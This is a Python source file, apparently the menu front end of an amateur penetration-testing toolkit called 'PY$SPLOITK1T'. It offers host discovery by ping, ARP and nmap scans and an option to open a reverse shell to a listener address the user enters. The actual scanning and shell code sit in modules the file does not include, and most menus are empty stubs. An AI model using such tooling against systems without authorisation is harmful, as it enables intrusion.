import sys
import os
from modules import scanenv, localhostenv, reverse_shell
from pyfiglet import Figlet

def banner(titel):
    f = Figlet(font='avatar')
    print(f.renderText(titel))

class LocalHostData:

    def __init__(self):
        pass

    def get_info_data(self):
        localhostenv.gather_local_host_info()

# contains any active recon scan option
class Hostdiscovery:

    def __init__(self, discover_command):
        self.discover_command = discover_command

    def ping_host(ip_address):
        scanenv.icmp_echo(ip_address)

    def arp_scan(ip_address_range):
        scanenv.arp_scan(ip_address_range)

    def icmp_host_discover(ip_address_range):
        scanenv.icmp_host_discover(ip_address_range)

# contains any control option of the user and its mechanisms
class AttackController:

    def __init__(self):
        pass

    def local_host_menu(self):

        os.system("clear")

        print("[1]\tBASIC HOST INFORMATION")

        user_command = input("[$]> ")

        if user_command == "1":

            os.system("clear")

            LocalHostData().get_info_data()

    def scanning_menu(self):

        os.system("clear")

        print("[1]\tICMP ECHO REPLY (ping host)")
        print("[2]\tARP SCAN")
        print("[3]\tICMP HOST DISCOVERY")
        print("[4]\tNMAP HOST DISCOVERY")
        print("[99]\tEXIT\n")

        user_command = input("[$]> ")

        os.system("clear")

        if user_command == "1":
            ip_destionation = input("[*] DESTINATION IP ADDRESS: ")
            scanenv.icmp_echo(ip_destionation)
        if user_command == "2":
            ip_address_range = input("[*] IP ADDRESS RANGE (f.e. 192.168.1.0/24): ")
            scanenv.arp_scan(ip_address_range)
        if user_command == "3":
            ip_address_range = input("[*] IP ADDRESS RANGE (f.e. 192.168.1.0/24): ")
            scanenv.icmp_host_discover(ip_address_range)
        if user_command == "4":
            ip_address_range = input("[*] IP ADDRESS RANGE (f.e. 192.168.1.0/24): ")
            scanenv.nmap_host_discover(ip_address_range)

    def deivery_menu(self):
        pass

    def exploit_menu(self):
        pass

    def reverseshell(self):
        listener_ip_address = input("[*] IP OF LISTENING HOST: ")

        rev = reverse_shell().ReverseShell()
        target_connection = rev.connect(listener_ip_address)

        rev.shell(target_connection)


    def categories(self):

        print("[0]\tLOCAL HOST INFORMATION")
        print("[1]\tSCANNING AND DISCOVERY")
        print("[2]\tWEB APPLICATION TESTING")
        print("[3]\tPASSWORD CRACKER")
        print("[4]\tREVERSE SHELLS")
        print("[5]\tCREATE A LISTENER")
        print("[6]\tEXPLOITAT FACTORY")
        print("[7]\tPOST EXPLOITATION")
        print("[99]\tEXIT\n")

        input_section = input("[$]> ")

        if input_section == "0":
            AttackController().local_host_menu()
        if input_section == "1":
            AttackController().scanning_menu()
        if input_section == "2":
            pass
        if input_section == "3":
            pass
        if input_section == "4":
            AttackController().reverseshell()

def main():

    try:

        banner("PY$SPLOITK1T")

        AttackController().categories()

    except KeyboardInterrupt:
        sys.exit()

    except Exception as e:
        print(f"[-] Error occured - {e}")
        sys.exit()

if __name__ == '__main__':

    os.system("clear")

    main()